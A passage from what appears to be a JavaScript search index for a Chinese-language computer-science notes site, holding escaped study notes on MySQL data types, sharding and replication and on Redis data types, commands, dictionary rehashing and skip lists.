VARCHAR \u8FD9\u79CD\u53D8\u957F\u7C7B\u578B\u80FD\u591F\u8282\u7701\u7A7A\u95F4\uFF0C\u56E0\u4E3A\u53EA\u9700\u8981\u5B58\u50A8\u5FC5\u8981\u7684\u5185\u5BB9\u3002\u4F46\u662F\u5728\u6267\u884C UPDATE \u65F6\u53EF\u80FD\u4F1A\u4F7F\u884C\u53D8\u5F97\u6BD4\u539F\u6765\u957F\uFF0C\u5F53\u8D85\u51FA\u4E00\u4E2A\u9875\u6240\u80FD\u5BB9\u7EB3\u7684\u5927\u5C0F\u65F6\uFF0C\u5C31\u8981\u6267\u884C\u989D\u5916\u7684\u64CD\u4F5C\u3002MyISAM \u4F1A\u5C06\u884C\u62C6\u6210\u4E0D\u540C\u7684\u7247\u6BB5\u5B58\u50A8\uFF0C\u800C InnoDB \u5219\u9700\u8981\u5206\u88C2\u9875\u6765\u4F7F\u884C\u653E\u8FDB\u9875\u5185\u3002
\u5728\u8FDB\u884C\u5B58\u50A8\u548C\u68C0\u7D22\u65F6\uFF0C\u4F1A\u4FDD\u7559 VARCHAR \u672B\u5C3E\u7684\u7A7A\u683C\uFF0C\u800C\u4F1A\u5220\u9664 CHAR \u672B\u5C3E\u7684\u7A7A\u683C\u3002`},{header:"\u65F6\u95F4\u548C\u65E5\u671F",slug:"\u65F6\u95F4\u548C\u65E5\u671F",content:"MySQL \u63D0\u4F9B\u4E86\u4E24\u79CD\u76F8\u4F3C\u7684\u65E5\u671F\u65F6\u95F4\u7C7B\u578B\uFF1ADATETIME \u548C TIMESTAMP\u3002"},{header:"1. DATETIME",slug:"_1-datetime",content:`\u80FD\u591F\u4FDD\u5B58\u4ECE 1000 \u5E74\u5230 9999 \u5E74\u7684\u65E5\u671F\u548C\u65F6\u95F4\uFF0C\u7CBE\u5EA6\u4E3A\u79D2\uFF0C\u4F7F\u7528 8 \u5B57\u8282\u7684\u5B58\u50A8\u7A7A\u95F4\u3002
\u5B83\u4E0E\u65F6\u533A\u65E0\u5173\u3002
\u9ED8\u8BA4\u60C5\u51B5\u4E0B\uFF0CMySQL \u4EE5\u4E00\u79CD\u53EF\u6392\u5E8F\u7684\u3001\u65E0\u6B67\u4E49\u7684\u683C\u5F0F\u663E\u793A DATETIME \u503C\uFF0C\u4F8B\u5982\u201C2008-01-16 22:37:08\u201D\uFF0C\u8FD9\u662F ANSI \u6807\u51C6\u5B9A\u4E49\u7684\u65E5\u671F\u548C\u65F6\u95F4\u8868\u793A\u65B9\u6CD5\u3002`},{header:"2. TIMESTAMP",slug:"_2-timestamp",content:`\u548C UNIX \u65F6\u95F4\u6233\u76F8\u540C\uFF0C\u4FDD\u5B58\u4ECE 1970 \u5E74 1 \u6708 1 \u65E5\u5348\u591C\uFF08\u683C\u6797\u5A01\u6CBB\u65F6\u95F4\uFF09\u4EE5\u6765\u7684\u79D2\u6570\uFF0C\u4F7F\u7528 4 \u4E2A\u5B57\u8282\uFF0C\u53EA\u80FD\u8868\u793A\u4ECE 1970 \u5E74\u5230 2038 \u5E74\u3002
\u5B83\u548C\u65F6\u533A\u6709\u5173\uFF0C\u4E5F\u5C31\u662F\u8BF4\u4E00\u4E2A\u65F6\u95F4\u6233\u5728\u4E0D\u540C\u7684\u65F6\u533A\u6240\u4EE3\u8868\u7684\u5177\u4F53\u65F6\u95F4\u662F\u4E0D\u540C\u7684\u3002
MySQL \u63D0\u4F9B\u4E86 FROM_UNIXTIME() \u51FD\u6570\u628A UNIX \u65F6\u95F4\u6233\u8F6C\u6362\u4E3A\u65E5\u671F\uFF0C\u5E76\u63D0\u4F9B\u4E86 UNIX_TIMESTAMP() \u51FD\u6570\u628A\u65E5\u671F\u8F6C\u6362\u4E3A UNIX \u65F6\u95F4\u6233\u3002
\u9ED8\u8BA4\u60C5\u51B5\u4E0B\uFF0C\u5982\u679C\u63D2\u5165\u65F6\u6CA1\u6709\u6307\u5B9A TIMESTAMP \u5217\u7684\u503C\uFF0C\u4F1A\u5C06\u8FD9\u4E2A\u503C\u8BBE\u7F6E\u4E3A\u5F53\u524D\u65F6\u95F4\u3002
\u5E94\u8BE5\u5C3D\u91CF\u4F7F\u7528 TIMESTAMP\uFF0C\u56E0\u4E3A\u5B83\u6BD4 DATETIME \u7A7A\u95F4\u6548\u7387\u66F4\u9AD8\u3002`},{header:"\u4E94\u3001\u5207\u5206",slug:"\u4E94\u3001\u5207\u5206",content:""},{header:"\u6C34\u5E73\u5207\u5206",slug:"\u6C34\u5E73\u5207\u5206",content:`\u6C34\u5E73\u5207\u5206\u53C8\u79F0\u4E3A Sharding\uFF0C\u5B83\u662F\u5C06\u540C\u4E00\u4E2A\u8868\u4E2D\u7684\u8BB0\u5F55\u62C6\u5206\u5230\u591A\u4E2A\u7ED3\u6784\u76F8\u540C\u7684\u8868\u4E2D\u3002
\u5F53\u4E00\u4E2A\u8868\u7684\u6570\u636E\u4E0D\u65AD\u589E\u591A\u65F6\uFF0CSharding \u662F\u5FC5\u7136\u7684\u9009\u62E9\uFF0C\u5B83\u53EF\u4EE5\u5C06\u6570\u636E\u5206\u5E03\u5230\u96C6\u7FA4\u7684\u4E0D\u540C\u8282\u70B9\u4E0A\uFF0C\u4ECE\u800C\u7F13\u5B58\u5355\u4E2A\u6570\u636E\u5E93\u7684\u538B\u529B\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/63c2909f-0c5f-496f-9fe5-ee9176b31aba.jpg" width="">`},{header:"\u5782\u76F4\u5207\u5206",slug:"\u5782\u76F4\u5207\u5206",content:`\u5782\u76F4\u5207\u5206\u662F\u5C06\u4E00\u5F20\u8868\u6309\u5217\u5207\u5206\u6210\u591A\u4E2A\u8868\uFF0C\u901A\u5E38\u662F\u6309\u7167\u5217\u7684\u5173\u7CFB\u5BC6\u96C6\u7A0B\u5EA6\u8FDB\u884C\u5207\u5206\uFF0C\u4E5F\u53EF\u4EE5\u5229\u7528\u5782\u76F4\u5207\u5206\u5C06\u7ECF\u5E38\u88AB\u4F7F\u7528\u7684\u5217\u548C\u4E0D\u7ECF\u5E38\u88AB\u4F7F\u7528\u7684\u5217\u5207\u5206\u5230\u4E0D\u540C\u7684\u8868\u4E2D\u3002
\u5728\u6570\u636E\u5E93\u7684\u5C42\u9762\u4F7F\u7528\u5782\u76F4\u5207\u5206\u5C06\u6309\u6570\u636E\u5E93\u4E2D\u8868\u7684\u5BC6\u96C6\u7A0B\u5EA6\u90E8\u7F72\u5230\u4E0D\u540C\u7684\u5E93\u4E2D\uFF0C\u4F8B\u5982\u5C06\u539F\u6765\u7684\u7535\u5546\u6570\u636E\u5E93\u5782\u76F4\u5207\u5206\u6210\u5546\u54C1\u6570\u636E\u5E93\u3001\u7528\u6237\u6570\u636E\u5E93\u7B49\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/e130e5b8-b19a-4f1e-b860-223040525cf6.jpg" width="">`},{header:"Sharding \u7B56\u7565",slug:"sharding-\u7B56\u7565",content:`\u54C8\u5E0C\u53D6\u6A21\uFF1Ahash(key) % N\uFF1B
\u8303\u56F4\uFF1A\u53EF\u4EE5\u662F ID \u8303\u56F4\u4E5F\u53EF\u4EE5\u662F\u65F6\u95F4\u8303\u56F4\uFF1B
\u6620\u5C04\u8868\uFF1A\u4F7F\u7528\u5355\u72EC\u7684\u4E00\u4E2A\u6570\u636E\u5E93\u6765\u5B58\u50A8\u6620\u5C04\u5173\u7CFB\u3002`},{header:"Sharding \u5B58\u5728\u7684\u95EE\u9898",slug:"sharding-\u5B58\u5728\u7684\u95EE\u9898",content:""},{header:"1. \u4E8B\u52A1\u95EE\u9898",slug:"_1-\u4E8B\u52A1\u95EE\u9898",content:"\u4F7F\u7528\u5206\u5E03\u5F0F\u4E8B\u52A1\u6765\u89E3\u51B3\uFF0C\u6BD4\u5982 XA \u63A5\u53E3\u3002"},{header:"2. \u8FDE\u63A5",slug:"_2-\u8FDE\u63A5",content:"\u53EF\u4EE5\u5C06\u539F\u6765\u7684\u8FDE\u63A5\u5206\u89E3\u6210\u591A\u4E2A\u5355\u8868\u67E5\u8BE2\uFF0C\u7136\u540E\u5728\u7528\u6237\u7A0B\u5E8F\u4E2D\u8FDB\u884C\u8FDE\u63A5\u3002"},{header:"3. ID \u552F\u4E00\u6027",slug:"_3-id-\u552F\u4E00\u6027",content:`\u4F7F\u7528\u5168\u5C40\u552F\u4E00 ID\uFF08GUID\uFF09
\u4E3A\u6BCF\u4E2A\u5206\u7247\u6307\u5B9A\u4E00\u4E2A ID \u8303\u56F4
\u5206\u5E03\u5F0F ID \u751F\u6210\u5668 (\u5982 Twitter \u7684 Snowflake \u7B97\u6CD5)`},{header:"\u516D\u3001\u590D\u5236",slug:"\u516D\u3001\u590D\u5236",content:""},{header:"\u4E3B\u4ECE\u590D\u5236",slug:"\u4E3B\u4ECE\u590D\u5236",content:`\u4E3B\u8981\u6D89\u53CA\u4E09\u4E2A\u7EBF\u7A0B\uFF1Abinlog \u7EBF\u7A0B\u3001I/O \u7EBF\u7A0B\u548C SQL \u7EBF\u7A0B\u3002 binlog \u7EBF\u7A0B \uFF1A\u8D1F\u8D23\u5C06\u4E3B\u670D\u52A1\u5668\u4E0A\u7684\u6570\u636E\u66F4\u6539\u5199\u5165\u4E8C\u8FDB\u5236\u65E5\u5FD7\uFF08Binary log\uFF09\u4E2D\u3002
I/O \u7EBF\u7A0B \uFF1A\u8D1F\u8D23\u4ECE\u4E3B\u670D\u52A1\u5668\u4E0A\u8BFB\u53D6\u4E8C\u8FDB\u5236\u65E5\u5FD7\uFF0C\u5E76\u5199\u5165\u4ECE\u670D\u52A1\u5668\u7684\u4E2D\u7EE7\u65E5\u5FD7\uFF08Relay log\uFF09\u3002
SQL \u7EBF\u7A0B \uFF1A\u8D1F\u8D23\u8BFB\u53D6\u4E2D\u7EE7\u65E5\u5FD7\uFF0C\u89E3\u6790\u51FA\u4E3B\u670D\u52A1\u5668\u5DF2\u7ECF\u6267\u884C\u7684\u6570\u636E\u66F4\u6539\u5E76\u5728\u4ECE\u670D\u52A1\u5668\u4E2D\u91CD\u653E\uFF08Replay\uFF09\u3002 ![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/master-slave.png" width="">`},{header:"\u8BFB\u5199\u5206\u79BB",slug:"\u8BFB\u5199\u5206\u79BB",content:`\u4E3B\u670D\u52A1\u5668\u5904\u7406\u5199\u64CD\u4F5C\u4EE5\u53CA\u5B9E\u65F6\u6027\u8981\u6C42\u6BD4\u8F83\u9AD8\u7684\u8BFB\u64CD\u4F5C\uFF0C\u800C\u4ECE\u670D\u52A1\u5668\u5904\u7406\u8BFB\u64CD\u4F5C\u3002
\u8BFB\u5199\u5206\u79BB\u80FD\u63D0\u9AD8\u6027\u80FD\u7684\u539F\u56E0\u5728\u4E8E\uFF1A \u4E3B\u4ECE\u670D\u52A1\u5668\u8D1F\u8D23\u5404\u81EA\u7684\u8BFB\u548C\u5199\uFF0C\u6781\u5927\u7A0B\u5EA6\u7F13\u89E3\u4E86\u9501\u7684\u4E89\u7528\uFF1B
\u4ECE\u670D\u52A1\u5668\u53EF\u4EE5\u4F7F\u7528 MyISAM\uFF0C\u63D0\u5347\u67E5\u8BE2\u6027\u80FD\u4EE5\u53CA\u8282\u7EA6\u7CFB\u7EDF\u5F00\u9500\uFF1B
\u589E\u52A0\u5197\u4F59\uFF0C\u63D0\u9AD8\u53EF\u7528\u6027\u3002 \u8BFB\u5199\u5206\u79BB\u5E38\u7528\u4EE3\u7406\u65B9\u5F0F\u6765\u5B9E\u73B0\uFF0C\u4EE3\u7406\u670D\u52A1\u5668\u63A5\u6536\u5E94\u7528\u5C42\u4F20\u6765\u7684\u8BFB\u5199\u8BF7\u6C42\uFF0C\u7136\u540E\u51B3\u5B9A\u8F6C\u53D1\u5230\u54EA\u4E2A\u670D\u52A1\u5668\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/master-slave-proxy.png" width="">`},{header:"\u53C2\u8003\u8D44\u6599",slug:"\u53C2\u8003\u8D44\u6599",content:`BaronScbwartz, PeterZaitsev, VadimTkacbenko, \u7B49. \u9AD8\u6027\u80FD MySQL[M]. \u7535\u5B50\u5DE5\u4E1A\u51FA\u7248\u793E, 2013.
\u59DC\u627F\u5C27. MySQL \u6280\u672F\u5185\u5E55: InnoDB \u5B58\u50A8\u5F15\u64CE [M]. \u673A\u68B0\u5DE5\u4E1A\u51FA\u7248\u793E, 2011.
20+ \u6761 MySQL \u6027\u80FD\u4F18\u5316\u7684\u6700\u4F73\u7ECF\u9A8C
\u670D\u52A1\u7AEF\u6307\u5357 \u6570\u636E\u5B58\u50A8\u7BC7 | MySQL\uFF0809\uFF09 \u5206\u5E93\u4E0E\u5206\u8868\u5E26\u6765\u7684\u5206\u5E03\u5F0F\u56F0\u5883\u4E0E\u5E94\u5BF9\u4E4B\u7B56
How to create unique row ID in sharded databases?
SQL Azure Federation \u2013 Introduction
MySQL \u7D22\u5F15\u80CC\u540E\u7684\u6570\u636E\u7ED3\u6784\u53CA\u7B97\u6CD5\u539F\u7406
MySQL \u6027\u80FD\u4F18\u5316\u795E\u5668 Explain \u4F7F\u7528\u5206\u6790
How Sharding Works
\u5927\u4F17\u70B9\u8BC4\u8BA2\u5355\u7CFB\u7EDF\u5206\u5E93\u5206\u8868\u5B9E\u8DF5
B + \u6811`}]},{path:"/java/",title:"\u7B14\u8BB0",pathLocale:"/",contents:[{header:"\u7B14\u8BB0",slug:"\u7B14\u8BB0",content:""}]},{path:"/java/Redis.html",title:"Redis",pathLocale:"/",contents:[{header:"Redis",slug:"redis",content:`Redis \u4E00\u3001\u6982\u8FF0
\u4E8C\u3001\u6570\u636E\u7C7B\u578B STRING
LIST
SET
HASH
ZSET \u4E09\u3001\u6570\u636E\u7ED3\u6784 \u5B57\u5178
\u8DF3\u8DC3\u8868 \u56DB\u3001\u4F7F\u7528\u573A\u666F \u8BA1\u6570\u5668
\u7F13\u5B58
\u67E5\u627E\u8868
\u6D88\u606F\u961F\u5217
\u4F1A\u8BDD\u7F13\u5B58
\u5206\u5E03\u5F0F\u9501\u5B9E\u73B0
\u5176\u5B83 \u4E94\u3001Redis \u4E0E Memcached \u6570\u636E\u7C7B\u578B
\u6570\u636E\u6301\u4E45\u5316
\u5206\u5E03\u5F0F
\u5185\u5B58\u7BA1\u7406\u673A\u5236 \u516D\u3001\u952E\u7684\u8FC7\u671F\u65F6\u95F4
\u4E03\u3001\u6570\u636E\u6DD8\u6C70\u7B56\u7565
\u516B\u3001\u6301\u4E45\u5316 RDB \u6301\u4E45\u5316
AOF \u6301\u4E45\u5316 \u4E5D\u3001\u4E8B\u52A1
\u5341\u3001\u4E8B\u4EF6 \u6587\u4EF6\u4E8B\u4EF6
\u65F6\u95F4\u4E8B\u4EF6
\u4E8B\u4EF6\u7684\u8C03\u5EA6\u4E0E\u6267\u884C \u5341\u4E00\u3001\u590D\u5236 \u8FDE\u63A5\u8FC7\u7A0B
\u4E3B\u4ECE\u94FE \u5341\u4E8C\u3001Sentinel
\u5341\u4E09\u3001\u5206\u7247
\u5341\u56DB\u3001\u4E00\u4E2A\u7B80\u5355\u7684\u8BBA\u575B\u7CFB\u7EDF\u5206\u6790 \u6587\u7AE0\u4FE1\u606F
\u70B9\u8D5E\u529F\u80FD
\u5BF9\u6587\u7AE0\u8FDB\u884C\u6392\u5E8F \u53C2\u8003\u8D44\u6599`},{header:"\u4E00\u3001\u6982\u8FF0",slug:"\u4E00\u3001\u6982\u8FF0",content:`Redis \u662F\u901F\u5EA6\u975E\u5E38\u5FEB\u7684\u975E\u5173\u7CFB\u578B\uFF08NoSQL\uFF09\u5185\u5B58\u952E\u503C\u6570\u636E\u5E93\uFF0C\u53EF\u4EE5\u5B58\u50A8\u952E\u548C\u4E94\u79CD\u4E0D\u540C\u7C7B\u578B\u7684\u503C\u4E4B\u95F4\u7684\u6620\u5C04\u3002
\u952E\u7684\u7C7B\u578B\u53EA\u80FD\u4E3A\u5B57\u7B26\u4E32\uFF0C\u503C\u652F\u6301\u4E94\u79CD\u6570\u636E\u7C7B\u578B\uFF1A\u5B57\u7B26\u4E32\u3001\u5217\u8868\u3001\u96C6\u5408\u3001\u6563\u5217\u8868\u3001\u6709\u5E8F\u96C6\u5408\u3002
Redis \u652F\u6301\u5F88\u591A\u7279\u6027\uFF0C\u4F8B\u5982\u5C06\u5185\u5B58\u4E2D\u7684\u6570\u636E\u6301\u4E45\u5316\u5230\u786C\u76D8\u4E2D\uFF0C\u4F7F\u7528\u590D\u5236\u6765\u6269\u5C55\u8BFB\u6027\u80FD\uFF0C\u4F7F\u7528\u5206\u7247\u6765\u6269\u5C55\u5199\u6027\u80FD\u3002`},{header:"\u4E8C\u3001\u6570\u636E\u7C7B\u578B",slug:"\u4E8C\u3001\u6570\u636E\u7C7B\u578B",content:`\u6570\u636E\u7C7B\u578B
\u53EF\u4EE5\u5B58\u50A8\u7684\u503C
\u64CD\u4F5C STRING
\u5B57\u7B26\u4E32\u3001\u6574\u6570\u6216\u8005\u6D6E\u70B9\u6570
\u5BF9\u6574\u4E2A\u5B57\u7B26\u4E32\u6216\u8005\u5B57\u7B26\u4E32\u7684\u5176\u4E2D\u4E00\u90E8\u5206\u6267\u884C\u64CD\u4F5C</br> \u5BF9\u6574\u6570\u548C\u6D6E\u70B9\u6570\u6267\u884C\u81EA\u589E\u6216\u8005\u81EA\u51CF\u64CD\u4F5C LIST
\u5217\u8868
\u4ECE\u4E24\u7AEF\u538B\u5165\u6216\u8005\u5F39\u51FA\u5143\u7D20 </br> \u5BF9\u5355\u4E2A\u6216\u8005\u591A\u4E2A\u5143\u7D20\u8FDB\u884C\u4FEE\u526A\uFF0C</br> \u53EA\u4FDD\u7559\u4E00\u4E2A\u8303\u56F4\u5185\u7684\u5143\u7D20 SET
\u65E0\u5E8F\u96C6\u5408
\u6DFB\u52A0\u3001\u83B7\u53D6\u3001\u79FB\u9664\u5355\u4E2A\u5143\u7D20</br> \u68C0\u67E5\u4E00\u4E2A\u5143\u7D20\u662F\u5426\u5B58\u5728\u4E8E\u96C6\u5408\u4E2D</br> \u8BA1\u7B97\u4EA4\u96C6\u3001\u5E76\u96C6\u3001\u5DEE\u96C6</br> \u4ECE\u96C6\u5408\u91CC\u9762\u968F\u673A\u83B7\u53D6\u5143\u7D20 HASH
\u5305\u542B\u952E\u503C\u5BF9\u7684\u65E0\u5E8F\u6563\u5217\u8868
\u6DFB\u52A0\u3001\u83B7\u53D6\u3001\u79FB\u9664\u5355\u4E2A\u952E\u503C\u5BF9</br> \u83B7\u53D6\u6240\u6709\u952E\u503C\u5BF9</br> \u68C0\u67E5\u67D0\u4E2A\u952E\u662F\u5426\u5B58\u5728 ZSET
\u6709\u5E8F\u96C6\u5408
\u6DFB\u52A0\u3001\u83B7\u53D6\u3001\u5220\u9664\u5143\u7D20</br> \u6839\u636E\u5206\u503C\u8303\u56F4\u6216\u8005\u6210\u5458\u6765\u83B7\u53D6\u5143\u7D20</br> \u8BA1\u7B97\u4E00\u4E2A\u952E\u7684\u6392\u540D What Redis data structures look like`},{header:"STRING",slug:"string",content:`![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/6019b2db-bc3e-4408-b6d8-96025f4481d6.png" width="400)
> set hello world
OK
> get hello
"world"
> del hello
(integer) 1
> get hello
(nil)`},{header:"LIST",slug:"list",content:`![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/fb327611-7e2b-4f2f-9f5b-38592d408f07.png" width="400)
> rpush list-key item
(integer) 1
> rpush list-key item2
(integer) 2
> rpush list-key item
(integer) 3 > lrange list-key 0 -1
1) "item"
2) "item2"
3) "item" > lindex list-key 1
"item2" > lpop list-key
"item" > lrange list-key 0 -1
1) "item2"
2) "item"`},{header:"SET",slug:"set",content:`![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/cd5fbcff-3f35-43a6-8ffa-082a93ce0f0e.png" width="400)
> sadd set-key item
(integer) 1
> sadd set-key item2
(integer) 1
> sadd set-key item3
(integer) 1
> sadd set-key item
(integer) 0 > smembers set-key
1) "item"
2) "item2"
3) "item3" > sismember set-key item4
(integer) 0
> sismember set-key item
(integer) 1 > srem set-key item2
(integer) 1
> srem set-key item2
(integer) 0 > smembers set-key
1) "item"
2) "item3"`},{header:"HASH",slug:"hash",content:`![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/7bd202a7-93d4-4f3a-a878-af68ae25539a.png" width="400)
> hset hash-key sub-key1 value1
(integer) 1
> hset hash-key sub-key2 value2
(integer) 1
> hset hash-key sub-key1 value1
(integer) 0 > hgetall hash-key
1) "sub-key1"
2) "value1"
3) "sub-key2"
4) "value2" > hdel hash-key sub-key2
(integer) 1
> hdel hash-key sub-key2
(integer) 0 > hget hash-key sub-key1
"value1" > hgetall hash-key
1) "sub-key1"
2) "value1"`},{header:"ZSET",slug:"zset",content:`![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/1202b2d6-9469-4251-bd47-ca6034fb6116.png" width="400)
> zadd zset-key 728 member1
(integer) 1
> zadd zset-key 982 member0
(integer) 1
> zadd zset-key 982 member0
(integer) 0 > zrange zset-key 0 -1 withscores
1) "member1"
2) "728"
3) "member0"
4) "982" > zrangebyscore zset-key 0 800 withscores
1) "member1"
2) "728" > zrem zset-key member1
(integer) 1
> zrem zset-key member1
(integer) 0 > zrange zset-key 0 -1 withscores
1) "member0"
2) "982"`},{header:"\u4E09\u3001\u6570\u636E\u7ED3\u6784",slug:"\u4E09\u3001\u6570\u636E\u7ED3\u6784",content:""},{header:"\u5B57\u5178",slug:"\u5B57\u5178",content:`dictht \u662F\u4E00\u4E2A\u6563\u5217\u8868\u7ED3\u6784\uFF0C\u4F7F\u7528\u62C9\u94FE\u6CD5\u89E3\u51B3\u54C8\u5E0C\u51B2\u7A81\u3002
/* This is our hash table structure. Every dictionary has two of this as we * implement incremental rehashing, for the old to the new table. */
typedef struct dictht { dictEntry **table; unsigned long size; unsigned long sizemask; unsigned long used;
} dictht;
typedef struct dictEntry { void *key; union { void *val; uint64_t u64; int64_t s64; double d; } v; struct dictEntry *next;
} dictEntry;
Redis \u7684\u5B57\u5178 dict \u4E2D\u5305\u542B\u4E24\u4E2A\u54C8\u5E0C\u8868 dictht\uFF0C\u8FD9\u662F\u4E3A\u4E86\u65B9\u4FBF\u8FDB\u884C rehash \u64CD\u4F5C\u3002\u5728\u6269\u5BB9\u65F6\uFF0C\u5C06\u5176\u4E2D\u4E00\u4E2A dictht \u4E0A\u7684\u952E\u503C\u5BF9 rehash \u5230\u53E6\u4E00\u4E2A dictht \u4E0A\u9762\uFF0C\u5B8C\u6210\u4E4B\u540E\u91CA\u653E\u7A7A\u95F4\u5E76\u4EA4\u6362\u4E24\u4E2A dictht \u7684\u89D2\u8272\u3002
typedef struct dict { dictType *type; void *privdata; dictht ht[2]; long rehashidx; /* rehashing not in progress if rehashidx == -1 */ unsigned long iterators; /* number of iterators currently running */
} dict;
rehash \u64CD\u4F5C\u4E0D\u662F\u4E00\u6B21\u6027\u5B8C\u6210\uFF0C\u800C\u662F\u91C7\u7528\u6E10\u8FDB\u65B9\u5F0F\uFF0C\u8FD9\u662F\u4E3A\u4E86\u907F\u514D\u4E00\u6B21\u6027\u6267\u884C\u8FC7\u591A\u7684 rehash \u64CD\u4F5C\u7ED9\u670D\u52A1\u5668\u5E26\u6765\u8FC7\u5927\u7684\u8D1F\u62C5\u3002
\u6E10\u8FDB\u5F0F rehash \u901A\u8FC7\u8BB0\u5F55 dict \u7684 rehashidx \u5B8C\u6210\uFF0C\u5B83\u4ECE 0 \u5F00\u59CB\uFF0C\u7136\u540E\u6BCF\u6267\u884C\u4E00\u6B21 rehash \u90FD\u4F1A\u9012\u589E\u3002\u4F8B\u5982\u5728\u4E00\u6B21 rehash \u4E2D\uFF0C\u8981\u628A dict[0] rehash \u5230 dict[1]\uFF0C\u8FD9\u4E00\u6B21\u4F1A\u628A dict[0] \u4E0A table[rehashidx] \u7684\u952E\u503C\u5BF9 rehash \u5230 dict[1] \u4E0A\uFF0Cdict[0] \u7684 table[rehashidx] \u6307\u5411 null\uFF0C\u5E76\u4EE4 rehashidx++\u3002
\u5728 rehash \u671F\u95F4\uFF0C\u6BCF\u6B21\u5BF9\u5B57\u5178\u6267\u884C\u6DFB\u52A0\u3001\u5220\u9664\u3001\u67E5\u627E\u6216\u8005\u66F4\u65B0\u64CD\u4F5C\u65F6\uFF0C\u90FD\u4F1A\u6267\u884C\u4E00\u6B21\u6E10\u8FDB\u5F0F rehash\u3002
\u91C7\u7528\u6E10\u8FDB\u5F0F rehash \u4F1A\u5BFC\u81F4\u5B57\u5178\u4E2D\u7684\u6570\u636E\u5206\u6563\u5728\u4E24\u4E2A dictht \u4E0A\uFF0C\u56E0\u6B64\u5BF9\u5B57\u5178\u7684\u67E5\u627E\u64CD\u4F5C\u4E5F\u9700\u8981\u5230\u5BF9\u5E94\u7684 dictht \u53BB\u6267\u884C\u3002
/* Performs N steps of incremental rehashing. Returns 1 if there are still * keys to move from the old to the new hash table, otherwise 0 is returned. * * Note that a rehashing step consists in moving a bucket (that may have more * than one key as we use chaining) from the old to the new hash table, however * since part of the hash table may be composed of empty spaces, it is not * guaranteed that this function will rehash even a single bucket, since it * will visit at max N*10 empty buckets in total, otherwise the amount of * work it does would be unbound and the function may block for a long time. */
int dictRehash(dict *d, int n) { int empty_visits = n * 10; /* Max number of empty buckets to visit. */ if (!dictIsRehashing(d)) return 0; while (n-- && d->ht[0].used != 0) { dictEntry *de, *nextde; /* Note that rehashidx can't overflow as we are sure there are more * elements because ht[0].used != 0 */ assert(d->ht[0].size > (unsigned long) d->rehashidx); while (d->ht[0].table[d->rehashidx] == NULL) { d->rehashidx++; if (--empty_visits == 0) return 1; } de = d->ht[0].table[d->rehashidx]; /* Move all the keys in this bucket from the old to the new hash HT */ while (de) { uint64_t h; nextde = de->next; /* Get the index in the new hash table */ h = dictHashKey(d, de->key) & d->ht[1].sizemask; de->next = d->ht[1].table[h]; d->ht[1].table[h] = de; d->ht[0].used--; d->ht[1].used++; de = nextde; } d->ht[0].table[d->rehashidx] = NULL; d->rehashidx++; } /* Check if we already rehashed the whole table... */ if (d->ht[0].used == 0) { zfree(d->ht[0].table); d->ht[0] = d->ht[1]; _dictReset(&d->ht[1]); d->rehashidx = -1; return 0; } /* More to rehash... */ return 1;
}`},{header:"\u8DF3\u8DC3\u8868",slug:"\u8DF3\u8DC3\u8868",content:`\u662F\u6709\u5E8F\u96C6\u5408\u7684\u5E95\u5C42\u5B9E\u73B0\u4E4B\u4E00\u3002
\u8DF3\u8DC3\u8868\u662F\u57FA\u4E8E\u591A\u6307\u9488\u6709\u5E8F\u94FE\u8868\u5B9E\u73B0\u7684\uFF0C\u53EF\u4EE5\u770B\u6210\u591A\u4E2A\u6709\u5E8F\u94FE\u8868\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/beba612e-dc5b-4fc2-869d-0b23408ac90a.png" width="600px)
\u5728\u67E5\u627E\u65F6\uFF0C\u4ECE\u4E0A\u5C42\u6307\u9488\u5F00\u59CB\u67E5\u627E\uFF0C\u627E\u5230\u5BF9\u5E94\u7684\u533A\u95F4\u4E4B\u540E\u518D\u5230\u4E0B\u4E00\u5C42\u53BB\u67E5\u627E\u3002\u4E0B\u56FE\u6F14\u793A\u4E86\u67E5\u627E 22 \u7684\u8FC7\u7A0B\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/0ea37ee2-c224-4c79-b895-e131c6805c40.png" width="600px)
\u4E0E\u7EA2\u9ED1\u6811\u7B49\u5E73\u8861\u6811\u76F8\u6BD4\uFF0C\u8DF3\u8DC3\u8868\u5177\u6709\u4EE5\u4E0B\u4F18\u70B9\uFF1A \u63D2\u5165\u901F\u5EA6\u975E\u5E38\u5FEB\u901F\uFF0C\u56E0\u4E3A\u4E0D\u9700\u8981\u8FDB\u884C\u65CB\u8F6C\u7B49\u64CD\u4F5C\u6765\u7EF4\u62A4\u5E73\u8861\u6027\uFF1B
\u66F4\u5BB9\u6613\u5B9E\u73B0\uFF1B
\u652F\u6301\u65E0\u9501\u64CD\u4F5C\u3002`},{header:"\u56DB\u3001\u4F7F\u7528\u573A\u666F",slug:"\u56DB\u3001\u4F7F\u7528\u573A\u666F",content:""},{header:"\u8BA1\u6570\u5668",slug:"\u8BA1\u6570\u5668",content:`\u53EF\u4EE5\u5BF9 String \u8FDB\u884C\u81EA\u589E\u81EA\u51CF\u8FD0\u7B97\uFF0C\u4ECE\u800C\u5B9E\u73B0\u8BA1\u6570\u5668\u529F\u80FD\u3002
